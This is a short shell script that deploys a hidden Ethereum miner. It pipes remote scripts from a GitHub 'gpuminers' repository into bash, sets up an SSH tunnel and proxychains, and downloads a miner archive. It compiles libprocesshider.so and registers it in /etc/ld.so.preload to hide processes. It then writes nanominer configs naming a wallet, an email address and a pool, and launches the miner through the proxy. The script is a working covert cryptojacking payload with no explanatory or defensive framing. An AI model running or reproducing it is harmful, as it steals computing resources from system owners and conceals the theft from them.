#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
sleep .1
proxychains curl ifconfig.me

proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload


cat > config_eth.ini <<END
[Ethash]
wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
rigName = Nano
email = mikrotik1991@gmail.com
pool1 = naw-eth.hiveon.net:24443
END

cat > config.ini <<END
[Ethash]
wallet = 0x8CB8003E428D0Fd7693D22f576A212403728c64a
rigName = Nano
email = mikrotik1991@gmail.com
pool1 = naw-eth.hiveon.net:24443
END

chmod +x nanominer
chmod +x amdmemtweak
proxychains ./nanominer
